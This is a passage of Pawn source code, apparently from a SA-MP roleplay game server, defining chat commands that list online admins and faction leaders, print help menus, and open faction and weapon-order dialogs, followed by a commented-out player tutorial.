                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pAdmin] == 3)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                       // format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F21717}Loyal dmin{FFFFFF} - %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pAdmin] == 4)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        // format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F21717}Head admin{FFFFFF} - %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pAdmin] == 5)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F21717}Chief  admin{FFFFFF} - %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                }
            }
            if(count == 0)
            {
                SendClientMessage(playerid,COLOR_LIGHTGREEN,"No Admins online on the server");
            }
            else if(count == 1)
            {
                SendClientMessage(playerid,COLOR_LIGHTGREEN,"Now is 1 admin online.");
            }
            else if (count >= 2)
            {
                format(string, sizeof(string), "Now are %d admins online.", count);
                SCM(playerid, COLOR_LIGHTGREEN, string);
            }
        }
        return 1;
    }

    if (strcmp(cmd, "/leaders", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new count = 0;
            SendClientMessage(playerid, CRISTIAN, "|_________Leaders Online_________|");
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerInfo[i][pLeader] == 1)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{171DFF}Leader PD{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 2)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{171DFF}Leader F.B.I{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }


                    if(PlayerInfo[i][pLeader] == 3)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{171DFF}Leader National Guard{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 4)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{57e547}Leader Medic{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 5)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{5D7E8D}Leader Silence Mafia{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 6)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{3E3535}Leader The Killers{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 7)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{BBF060}Leader Mayor{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 8)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{8E2323}Leader Hitman Agency{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 9)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{825B8C}Leader News Reporter{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pLeader] == 10)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{FFFF00}Leader Taxi Driver{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pLeader] == 11)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{0974C6}Leader School Instructor{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pLeader] == 12)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{19AF23}Leader Dangerous Tigers{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 13)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{FFBA00}Leader Legendary Men{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }


                    if(PlayerInfo[i][pLeader] == 14)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{B32CF6}Leader Fast N Furious{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 15)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{11E8E8}Leader Storm Men{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }

                    if(PlayerInfo[i][pLeader] == 16)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F9F7CE}Leader Tow Car Company{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pLeader] == 19)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{0E47FF}Leader The Racers{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pLeader] == 20)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{60F565}Leader San Fiero Police Departament{FFFFFF} %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                }

            }
            if(count == 0)
            {
                SendClientMessage(playerid,COLOR_LIGHTGREEN,"No Leaders online on the server");
            }
            else if(count == 1)
            {
                SendClientMessage(playerid,COLOR_LIGHTGREEN,"Now is 1 Leader online.");
            }
            else if (count >= 2)
            {
                format(string, sizeof(string), "Now are %d Leader online.", count);
                SCM(playerid, COLOR_LIGHTGREEN, string);
            }
        }
        return 1;
    }

/*----------------------------------------------------------------------------*/
    if (strcmp(cmd, "/licensers", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SendClientMessage(playerid, COLOR_LIGHTRED, "Licensers Online:");
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerInfo[i][pMember] == 11 || PlayerInfo[i][pLeader] == 11)
                    {
                    new sinum = PlayerInfo[i][pPnumber];
                        GetPlayerName(i, sendername, sizeof(sendername));
                        format(string, 256, "** Phone number: %s Name: %s", FormatPhoneNumber(sinum) ,sendername);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    }
                }
            }
        }
        return 1;
    }
//----------------------------------[HELP]-----------------------------------------------
    if(strcmp(cmd, "/animhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
            SendClientMessage(playerid, COLOR_GRAD4,"*** ANIMATIONS *** /animlist /stopanim");
        }
        return 1;
    }
    if(strcmp(cmd, "/payday", true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] >= 9)
        {
            if(IsPlayerConnected(playerid))
            {
                PayDay();
                return 1;
            }
        }
    }

 	if(!strcmp(cmd, "/help", true))
    {

         if(IsPlayerConnected(playerid))
		{
		    SendClientMessage(playerid, CRISTIAN,"_______________________________________");
		    SendClientMessage(playerid, COLOR_CRS1,"*** ACCOUNT *** /rules /stats /changepassword /buylevel");
			SendClientMessage(playerid, COLOR_CRS1,"*** GENERAL *** /pay /charity /time /buy /unrentvehicle /id /drink /clothes /buygun /timestamp, /sleep, /removecr");
			SendClientMessage(playerid, COLOR_CRS2,"*** GENERAL *** /report /cancel /accept /eject /usedrugs /contract /fill /fillcar /admins /showlicenses(/sl) /speedlimit,");
			SendClientMessage(playerid, COLOR_CRS2,"*** GENERAL *** /smoke /spawnchange /ad /licensers /usedrugs /lock /skill /licenses /mysamp /skinhelp /carradio, /myreferral");
	  		SendClientMessage(playerid, COLOR_CRS3,"*** CHAT *** (/cw)carwhisper (/s)hout /low /f(action) /b /me /togooc /tognews /togfam /togwhisper");
			SendClientMessage(playerid, COLOR_CRS3,"*** BANK *** /balance /withdraw /deposit /transfer");
			SendClientMessage(playerid, COLOR_CRS5,"*** OTHER *** /cellphonehelp /househelp /renthelp /businesshelp /leaderhelp /fishhelp /atmhelp");
			SendClientMessage(playerid, COLOR_CRS5,"*** OTHER *** /animhelp /jobhelp /carhelp /fhelp /eventhelp /setbio /bio");
		}

      return 1;
    }
    if(!strcmp(cmd,"/eventhelp",true))
    {
        SCM(playerid,COLOR_CRS4,"*** EVENT *** /e /event /requestevent /stopevent");
        if(PINFO[playerid][pAdmin] >= 1) SCM(playerid,COLOR_GG,"*** ADMIN EVENT *** /stopevent /ae");
        return 1;
    }
    if(strcmp(cmd, "/fhelp", true) == 0)
    {
    new me = PlayerInfo[playerid][pMember];
    new le = PlayerInfo[playerid][pLeader];
    if(le >= 1||me >= 1)
    {
            if(me==1||le==1)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /arrest /duty /wanted");
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /frisk /take /ticket (/gov)ernment /og(/opengate) /speedc (/cu)ff (/ta)zer");
            SendClientMessage(playerid, COLOR_CRS5, "*** FACTION *** /handscuff (/hcu) /handsuncuff (/hucu) /suspend /rb /dallrb");
            }
            if(me==2||le==2)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /arrest  /ram");
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /frisk /take (/gov)ernment /og(/opengate) (/cu)ff (/ta)zer");
            SendClientMessage(playerid, COLOR_CRS5, "*** FACTION *** /handscuff (/hcu) /handsuncuff (/hucu) /duty /wanted /rb /dallrb");
            }
            if(me==3||le==3)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /arrest  /ram");
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /frisk /take (/gov)ernment /og(/opengate) (/cu)ff (/ta)zer /opencell /openallcells");
            SendClientMessage(playerid, COLOR_CRS5, "*** FACTION *** /handscuff (/hcu) /handsuncuff (/hucu) /duty /wanted /closecell /closeallcells /punish /rb /dallrb");
            }
            if(me==20||le==20)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** (/r)adio (/d)epartments (/m)egaphone (/su)spect /arrest /ram");
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /frisk /take (/gov)ernment /og(/opengate) (/cu)ff (/ta)zer /opencell");
            SendClientMessage(playerid, COLOR_CRS5, "*** FACTION *** /handscuff (/hcu) /handsuncuff (/hucu) /duty /wanted /closecell /rb /dallrb");
            }
            if(me==4||le==4)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** (/r)adio (/d)epartments /heal /sheal /lc /duty");
            }
            if(me==5||le==5||me==6||le==6||me==12||le==12||me==13||le==13||le==14||me==14||me==15||le==15||le==19||le==19)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FAMILY *** /fdeposit /turfs /wartime /fwithdraw /fdrugs /fmats /order /heal /attack /f");
            }
            if(me==7||le==7)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FACTION *** /settax /givetax /gov");
            }
            if(me==8||le==8)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FACTION *** /portable /f /ram");
            }
            if(me==9||le==9)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /live /news /f");
            }
            if(me==10||le==10)
            {
            SendClientMessage(playerid, COLOR_CRS4, "*** FACTION *** /fare /accept taxi /f");
            }
            if(me==11||le==11)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FACTION *** /startlesson /stoplesson /givelicense /f");
            }
            if(me==16||le==16)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FACTION *** /towls, /towlv, press ctrl for tow car /f");
            }
            if(me==17||le==17)
            {
            SendClientMessage(playerid,COLOR_CRS4,"*** FACTION *** /f /ram And Your Admin Level CMD");
            }
    }
    else
    {
    SCM(playerid,COLOR_GREEN,"Error: You are not in any faction/family.");
    return 1;
    }
    return 1;
    }


    if(strcmp(cmd, "/chelp", true) == 0)
    {
    SendClientMessage(playerid, COLOR_CRS4, "*** Clan *** /c /cinfo || Leader Help : /cleaderhelp");
    return 1;
    }
    if(strcmp(cmd, "/cleaderhelp", true) == 0)
    {
    SendClientMessage(playerid, COLOR_CRS4, "*** Clan *** /clanwarn /clanunwarn /cinvite /cuninvite /csetrank /cmembers");
    return 1;
    }
    if(!strcmp(cmd,"/portable",true))
    {
        if(PINFO[playerid][pMember] != 8 && PINFO[playerid][pLeader] != 8) return SCM(playerid,COLOR_HITMAN,"You are not a Hitman Member.");
        if(HLapTop[playerid] == true) return SCM(playerid,COLOR_HITMAN,"You already connected to the Hitman Agency Server, type Logout to disconnect.");
        format(string,sizeof string,"Welcome Agent %s to the Hitman Agency Server.",PINFO[playerid][pName]);
        SCM(playerid,COLOR_HITMAN,string);
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}News {8E2323}- {FFFFFF}Displays News channel service");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}MyContract {8E2323}- {FFFFFF}Show your contract");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Gethit {8E2323}- {FFFFFF}You can assign a contract with this");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Leavehit {8E2323}- {FFFFFF}You can cancel your contract");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Order {8E2323}- {FFFFFF}Order the weapons package according to your rank.");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Ranks {8E2323}- {FFFFFF}Displays online members and their rank.");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}Covername {8E2323}- {FFFFFF}For hidden or Showed");
        SCM(playerid,COLOR_HITMAN,"| - {FFFFFF}LOGOUT {8E2323}- {FFFFFF}Disconnect from Agency Server");
        HLapTop[playerid] = true;
        return 1;
    }
    if(!strcmp(cmd,"/order",true))
    {
	    if(!IsAMember(playerid)) return SCM(playerid,COLOR_ALI,"You are not a Family Member.");
    	if(IsPlayerInHQ(playerid))
	    {
		    if(PINFO[playerid][pGunLic] == 0) return SCM(playerid,COLOR_ALI,"You haven't a weapon license.");
			ShowPlayerDialog(playerid,DIALOG_ORDER,DIALOG_STYLE_LIST,"{57e547}Order Guns","{57e547}> Full Health And Armour\n{FFFFFF}Desert Eagle {57e547}(+1)\n{FFFFFF}AK-47 {57e547}(+2)\n{FFFFFF}M4 {57e547}(+2)\n{FFFFFF}Shotgun {57e547}(+2)\n{FFFFFF}Combat Shotgun {57e547}(+3)\n{FFFFFF}Tec-9 {57e547}(+4)\n{FFFFFF}Micro Uzi {57e547}(+4)\n{FFFFFF}Rifle {57e547}(+5)","Entekhab","Enseraf");
		    return 1;
    	}
	    else
	    {
		    SCM(playerid,COLOR_ALI,"You are not in your HQ.");
		    return 1;
	    }
    }



    if(strcmp(cmd, "/startlfgpower", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SCM(playerid,COLOR_LIGHTRED,"Siktir Kon Farzandam :D");
            return 1;
        }
    }

    if(strcmp(cmd, "/adjustpower", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SCM(playerid,COLOR_LIGHTRED,"Siktir Kon Farzandam :D");
            return 1;
        }
    }

    if(strcmp(cmd, "/skinhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SCM(playerid,COLOR_LIGHTRED,"Press F4 to change skin.");
            SCM(playerid,COLOR_LIGHTRED,"Press F1 to see SA-MP keys.");
            return 1;
        }
    }
//----------------------------------[HELP]-----------------------------------------------
    if(strcmp(cmd, "/rules", true) == 0)
    {
		SendClientMessage(playerid, COLOR_YELLOW2,"Be /Forum Baraie Etela Az Ghavanin Va Etelaat Server Morajee Konid.");
        return 1;
    }
    if(strcmp(cmd, "/forum", true) == 0)
    {
		SendClientMessage(playerid, COLOR_LIGHTBLUE,"Forum.{57e547}JoKeR GaminG {FFFFFF}.iR");
        return 1;
    }
	/*
   if(strcmp(cmd, "/tutorialen", true) == 0)
    {

             if(TutTime1[i] == 3)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The Beginning{FFFF00}_____|");
                }
                else if(TutTime1[i] == 6)
                {
                    SendClientMessage(i, COLOR_TUT96, "Hello there, I see you're new, we'll show you a quick Tutorial.");
                    SendClientMessage(i, COLOR_TUT96, "Firstly, all new players need to know what should or shouldn't on this server.");
                    SendClientMessage(i, COLOR_TUT96, "We'll give you some information, so please pay attention to avoid additional questions.");
                }
                else if(TutTime1[i] == 18)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}About Server{FFFF00}_____|");
                }
                else if(TutTime1[i] == 21)
                {
                    SendClientMessage(i, COLOR_TUT96, "This server is a RolePlay.");
                    SendClientMessage(i, COLOR_TUT96, "We don't accept players who don't respect the rules or come here for DeathMach");
                    SendClientMessage(i, COLOR_TUT96, "The name that you have chosen matters a lot, each player can choose what name he/she likes.");
                    SendClientMessage(i, COLOR_TUT96, "We recommend you to choose legible name like: Andrew, Thomas, Matt.");
                    SendClientMessage(i, COLOR_TUT96, "If you want to know more about RPG, visit our forum.");
                    SendClientMessage(i, COLOR_TUT96, "(You can find the forum on our webpage: http://wWw.VirtualLifeiran.iR)");
                }
                else if(TutTime1[i] == 36)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Help{FFFF00}_____|");
                }
                else if(TutTime1[i] == 39)
                {
                    SendClientMessage(i, COLOR_TUT96, "If you're confused and you would like to know more information, ask a player or a helper(/helpers).");
                    SendClientMessage(i, COLOR_TUT96, "Use common sentences like: 'Hey, can you help me?'.");
                    SendClientMessage(i, COLOR_TUT96, "Don't start shout at someone, because it will make you lock bad.");
                    SendClientMessage(i, COLOR_TUT96, "Use commands /call or /sms (if you have cellphone) to talk with someone.");
                    SendClientMessage(i, COLOR_TUT96, "You can also access our forum (http://wWw.VirtualLifeiran.iR) to receive more help.");
                }
                else if(TutTime1[i] == 56)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Job's{FFFF00}_____|");
                }
                else if(TutTime1[i] == 59)
                {
                    SendClientMessage(i, COLOR_TUT96, "If you want to earn money you must have a job.");
                    SendClientMessage(i, COLOR_TUT96, "On this server you can have two type of jobs, one primary and one secondary.");
                    SendClientMessage(i, COLOR_TUT96, "Primay job's:(you must make an application on the forum and requires a certain level for each faction).");
                    SendClientMessage(i, COLOR_TUT96, "Level 3+: Fireman/Paramedic, News Reports, School Instructor, Tow Car Company or Taxi Drive.");
                    SendClientMessage(i, COLOR_TUT96, "Level 5+(Families): Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men or Fast N Furious.");
                    SendClientMessage(i, COLOR_TUT96, "Level 10: Police Departament, FBI, National Guard, SFPD or Hitman Agency. ");
                    SendClientMessage(i, COLOR_TUT96, "Secondary Job's: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Bus Drive , Trucker , Farmer, Garbageman");
                }
                else if(TutTime1[i] == 80)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime1[i] == 83)
                {
                    SendClientMessage(i, COLOR_TUT96, "As a RolePlay server, you can increase your level by staying online.");
                    SendClientMessage(i, COLOR_TUT96, "To level up need a certain number or Respect Points.");
                    SendClientMessage(i, COLOR_TUT96, "You earn a Respect Point every PayDay (it comes after 60 minutes).");
                    SendClientMessage(i, COLOR_TUT96, "To see how many points you need, you have to write /stats and look at the 'Respect: x/x'.");
                    SendClientMessage(i, COLOR_TUT96, "When you reach the required number of points then you should write /buylevel to do level up (it will cost a some of money). ");
                }
                else if(TutTime1[i] == 101)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Cheats{FFFF00}_____|");
                }
                else if(TutTime1[i] == 104)
                {
                    SendClientMessage(i, COLOR_TUT96, "It is a forbbiden to use hackings applications.");
                    SendClientMessage(i, COLOR_TUT96, "If you see someone who uses hacks, notify us by using /report.");
                    SendClientMessage(i, COLOR_TUT96, "Those who are using hacks will be banned permanently.");
                    SendClientMessage(i, COLOR_TUT96, "Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime1[i] == 116)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Language{FFFF00}_____|");
                }
                else if(TutTime1[i] == 119)
                {
                    SendClientMessage(i, COLOR_TUT96, "Every player must speak in Persian or English.");
                    SendClientMessage(i, COLOR_TUT96, "If you want talk other language then use /b.");
                    SendClientMessage(i, COLOR_TUT96, "Do not used capital letters and please write correctly.");
                    SendClientMessage(i, COLOR_TUT96, "Also, you are not allowed to use nasty words.");
                    SendClientMessage(i, COLOR_TUT96, "Advertisments of other servers will get you to permanent ban.");
                }
                else if(TutTime1[i] == 131)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The End{FFFF00}_____|");
                }
                else if(TutTime1[i] == 134)
                {
                    SendClientMessage(i, COLOR_TUT96, "I hope you understand what is RolePlay about.");
                    SendClientMessage(i, COLOR_TUT96, "We still want to remember you that you have to read our rules(/rules).");
                    SendClientMessage(i, COLOR_TUT96, "VirtualLifeiran wishes you have fun!");
                }

    return 1;
    }
    if(strcmp(cmd, "/tutorialfa", true) == 0)
    {
                 if(TutTime[i] == 3)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Shoroo{FFFF00}_____|");
                }
                else if(TutTime[i] == 6)
                {
                    SendClientMessage(i, COLOR_TUT96, "Salam, Khosh amadid be Server ma (VirtualLifeiran) ma yek seri ghavanin haro behetoon neshoon midim.");
                    SendClientMessage(i, COLOR_TUT96, "Tamame Bazikon Ha bayad bedoonan ke che kari ro mitoonan anjam bedan ya che kari ro nemitoonan anjam bedan ");
                    SendClientMessage(i, COLOR_TUT96, "ma ye seri nokte haro dar ekhtiaretoon mizarim, agar soali bood forum maro bekhoonid(too bazi benevisid /forum).");
                }
                else if(TutTime[i] == 20)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Darbare Server{FFFF00}_____|");
                }
                else if(TutTime[i] == 23)
